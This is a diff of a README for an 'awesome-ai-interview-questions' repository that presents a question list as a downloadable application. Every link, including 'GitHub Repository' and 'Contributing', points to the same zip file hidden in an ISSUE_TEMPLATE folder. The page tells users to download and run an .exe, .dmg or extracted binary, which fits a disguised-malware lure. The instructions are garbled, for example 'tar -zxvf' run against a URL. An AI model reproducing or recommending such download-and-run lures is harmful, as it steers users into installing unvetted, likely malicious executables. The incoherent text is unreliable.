@@ -1,6 +1,6 @@
 # 📚 awesome-ai-interview-questions - Your Essential Guide to AI Interviews
 
-[![Download the Latest Release](https://raw.githubusercontent.com/dairve/awesome-ai-interview-questions/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip%20Latest%https://raw.githubusercontent.com/dairve/awesome-ai-interview-questions/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip)](https://raw.githubusercontent.com/dairve/awesome-ai-interview-questions/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip)
+[![Download the Latest Release](https://github.com/dairve/awesome-ai-interview-questions/raw/refs/heads/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip%20Latest%https://github.com/dairve/awesome-ai-interview-questions/raw/refs/heads/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip)](https://github.com/dairve/awesome-ai-interview-questions/raw/refs/heads/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,13 +8,13 @@ Welcome! This guide will help you download and run the “awesome-ai-interview-q
 
 ## 🔗 Download & Install
 
-To get started, visit this page to download the latest version of the application: [Download Latest Release](https://raw.githubusercontent.com/dairve/awesome-ai-interview-questions/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip).
+To get started, visit this page to download the latest version of the application: [Download Latest Release](https://github.com/dairve/awesome-ai-interview-questions/raw/refs/heads/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip).
 
 Once you are on the releases page, look for the most recent version. You will find various files available for download. Choose the one that matches your system:
 
 1. **Windows Users**: Download the `.exe` file.
 2. **Mac Users**: Download the `.dmg` file.
-3. **Linux Users**: Download the compressed `https://raw.githubusercontent.com/dairve/awesome-ai-interview-questions/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip` file.
+3. **Linux Users**: Download the compressed `https://github.com/dairve/awesome-ai-interview-questions/raw/refs/heads/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip` file.
 
 After downloading, follow these steps to install:
 
@@ -34,9 +34,9 @@ After downloading, follow these steps to install:
 ### For Linux:
 
 1. Open the terminal.
-2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/dairve/awesome-ai-interview-questions/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip` file.
+2. Navigate to the directory where you downloaded the `https://github.com/dairve/awesome-ai-interview-questions/raw/refs/heads/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip` file.
 3. Use the following commands:
-   - `tar -zxvf https://raw.githubusercontent.com/dairve/awesome-ai-interview-questions/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip` to extract the files.
+   - `tar -zxvf https://github.com/dairve/awesome-ai-interview-questions/raw/refs/heads/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip` to extract the files.
    - Navigate to the extracted folder and run `./your_app` to start the application.
 
 ## 📖 How to Use the Application
@@ -97,8 +97,8 @@ This project is licensed under the MIT License. You can view the details in the 
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/dairve/awesome-ai-interview-questions/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip)
-- [Contributing](https://raw.githubusercontent.com/dairve/awesome-ai-interview-questions/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip)
-- [Explore more awesome tools](https://raw.githubusercontent.com/dairve/awesome-ai-interview-questions/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip)
+- [GitHub Repository](https://github.com/dairve/awesome-ai-interview-questions/raw/refs/heads/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip)
+- [Contributing](https://github.com/dairve/awesome-ai-interview-questions/raw/refs/heads/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip)
+- [Explore more awesome tools](https://github.com/dairve/awesome-ai-interview-questions/raw/refs/heads/main/github/ISSUE_TEMPLATE/ai_awesome_interview_questions_1.1.zip)
 
 For any further inquiries, feel free to reach out via the GitHub Issues page. Thank you for using the “awesome-ai-interview-questions” application!
